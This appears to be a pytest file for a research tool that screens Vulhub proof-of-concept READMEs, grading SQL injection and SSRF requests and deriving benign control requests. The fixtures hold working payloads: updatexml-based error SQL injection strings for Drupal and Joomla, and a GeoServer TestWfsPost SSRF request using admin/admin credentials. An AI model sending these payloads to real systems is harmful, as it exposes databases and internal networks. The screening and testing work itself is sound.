from __future__ import annotations
import hashlib,json,subprocess,sys,urllib.parse
from pathlib import Path

from research.risk_controlled_confirmation_experiment import screen_capture_jobs as sc
from research.risk_controlled_confirmation_experiment import run_local_documented_capture as rl


def _stamp(x):
    x=dict(x)
    x['source_request_sha256']=hashlib.sha256(str(x.get('raw','')).encode()).hexdigest()
    x['parsed_spec_sha256']=sc.spec_sha256(x)
    return x


def test_updatexml_is_recognized_as_error_based_sqli():
    spec={'method':'GET','url':'http://your-ip:8080/index.php?list[fullordering]=updatexml(0x23,concat(1,user()),1)','headers':[],'data':[]}
    assert sc._relevant('sqli',spec)


def test_drupal_form_key_error_sqli_derives_benign_same_endpoint_control():
    body='pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a'
    src=_stamp({'source':'raw_http','raw':body,'method':'POST','url':'http://your-ip:8080/?q=node&destination=node','headers':['Content-Type: application/x-www-form-urlencoded'],'data':[body],'user':None,'session_key':'anonymous'})
    control,candidate=sc._safe_sqli_control_pair(src)
    assert control['sqli_probe_role']=='control'
    assert candidate['sqli_probe_role']=='candidate'
    assert sc._endpoint(control)==sc._endpoint(candidate)
    assert not sc._relevant('sqli',control)
    assert sc._relevant('sqli',candidate)
    assert 'updatexml' not in urllib.parse.unquote(control['data'][0]).lower()
    assert 'name[1]=bob' in urllib.parse.unquote(control['data'][0])
    assert candidate['data'][0]==body
    assert control['source_parsed_spec_sha256']==src['parsed_spec_sha256']
    assert control['transformed_request_sha256']!=candidate['transformed_request_sha256']
    assert control['safe_proof_transformation']==sc.SAFE_SQLI_CONTROL_TRANSFORMATION


def test_joomla_ambiguous_updatexml_stays_partial_without_synthetic_full_pair():
    url='http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)'
    src=_stamp({'source':'direct_url','raw':url,'method':'GET','url':url,'headers':[],'data':[],'user':None,'session_key':'anonymous'})
    grade,reason,selected=sc._grade('sqli',[src],'# Exploit\n'+url)
    assert grade=='partial'
    assert len(selected)==1
    assert selected[0]['url']==url


def test_ssrf_explicit_host_alignment_is_annotated_and_effective_host_is_callback_authority():
    spec=_stamp({'source':'raw_http','raw':'POST /geoserver/TestWfsPost HTTP/1.1','method':'POST','url':'http://internal/geoserver/TestWfsPost','headers':['Host: internal','Content-Type: application/x-www-form-urlencoded'],'data':['form_hf_0=&url=http://internal/geoserver/../&body=testtest&username=admin&password=admin'],'user':None,'session_key':'anonymous'})
    text='The host in the `url` parameter must match the `Host` header in your request.'
    annotated=sc._annotate_ssrf_host_alignment([spec],text)[0]
    assert annotated['ssrf_host_alignment_required'] is True
    cb='http://172.18.0.1:9999/rfc/nonce'
    out,changes=rl._replace_ssrf_values(annotated,cb)
    assert changes
    assert out['effective_host_header']=='172.18.0.1:9999'
    headers,dropped=rl._headers(out)
    assert headers['Host']=='172.18.0.1:9999'
    assert out['ssrf_host_alignment_metadata']['required'] is True
    assert 'controlled_ssrf_host_header_alignment' in out['allowed_transformations']


def test_geoserver_server_send_request_text_is_full_ssrf_expectation():
    spec=_stamp({'source':'raw_http','raw':'x','method':'POST','url':'http://internal/geoserver/TestWfsPost','headers':['Host: internal','Content-Type: application/x-www-form-urlencoded'],'data':['url=http://internal/geoserver/../&body=testtest'],'user':None,'session_key':'anonymous'})
    text='# Exploit\nThe url parameter can make the server send requests to arbitrary URLs. Response from google.com is returned.'
    grade,reason,selected=sc._grade('ssrf',[spec],text)
    assert grade=='full'
    assert selected


def _run_screen(tmp_path:Path, group:str, category:str, scenario_kind:str, readme_text:str):
    srcroot=tmp_path/'sources';readme=srcroot/'vulhub'/'case'/'README.md';readme.parent.mkdir(parents=True)
    readme.write_text(readme_text)
    recipes=tmp_path/'recipes.jsonl';recipes.write_text(json.dumps({'group_id':group,'category':category,'scenario_kind':scenario_kind,'source_name':'vulhub','readme_path':'case/README.md','compose_path':'case/docker-compose.yml','environment_fingerprint':'ENV-'+group})+'\n')
    out=tmp_path/'screened.jsonl';summary=tmp_path/'summary.json'
    subprocess.run([sys.executable,sc.__file__,'--recipes',str(recipes),'--sources-root',str(srcroot),'--output',str(out),'--summary',str(summary)],check=True,capture_output=True,text=True)
    return json.loads(out.read_text())


def test_screening_integration_unlocks_drupal_positive_confirmable(tmp_path:Path):
    readme='''# Drupal SQL Injection\n## POC\n```http\nPOST /?q=node&destination=node HTTP/1.1\nHost: your-ip:8080\nContent-Type: application/x-www-form-urlencoded\n\npass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a\n```\n'''
    row=_run_screen(tmp_path,'G-DRUPAL','sqli','positive_confirmable',readme)
    assert row['preexecution_automatable'] is True
    assert row['documentation_grade']=='full'
    assert [x['sqli_probe_role'] for x in row['selected_requests']]==['control','candidate']
    assert row['safe_proof_transformations'][0]['transformation']==sc.SAFE_SQLI_CONTROL_TRANSFORMATION


def test_screening_integration_unlocks_joomla_ambiguous_without_derived_control(tmp_path:Path):
    url='http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)'
    row=_run_screen(tmp_path,'G-JOOMLA','sqli','ambiguous_positive','# Exploit\nVisit following link directly:\n'+url+'\n')
    assert row['preexecution_automatable'] is True
    assert row['documentation_grade']=='partial'
    assert len(row['selected_requests'])==1
    assert row['safe_proof_transformations']==[]


def test_screening_integration_unlocks_geoserver_ssrf_and_marks_alignment(tmp_path:Path):
    readme='''# GeoServer SSRF\n## Exploit\nThe `url` parameter can make the server send requests to arbitrary URLs.\n```http\nPOST /geoserver/TestWfsPost HTTP/1.1\nHost: internal\nContent-Type: application/x-www-form-urlencoded\n\nform_hf_0=&url=http://internal/geoserver/../&body=testtest&username=admin&password=admin\n```\nThe host in the `url` parameter must match the `Host` header in your request.\n'''
    row=_run_screen(tmp_path,'G-GEOSERVER','ssrf','positive_confirmable',readme)
    assert row['preexecution_automatable'] is True
    assert row['documentation_grade']=='full'
    assert row['selected_requests'][0]['ssrf_host_alignment_required'] is True
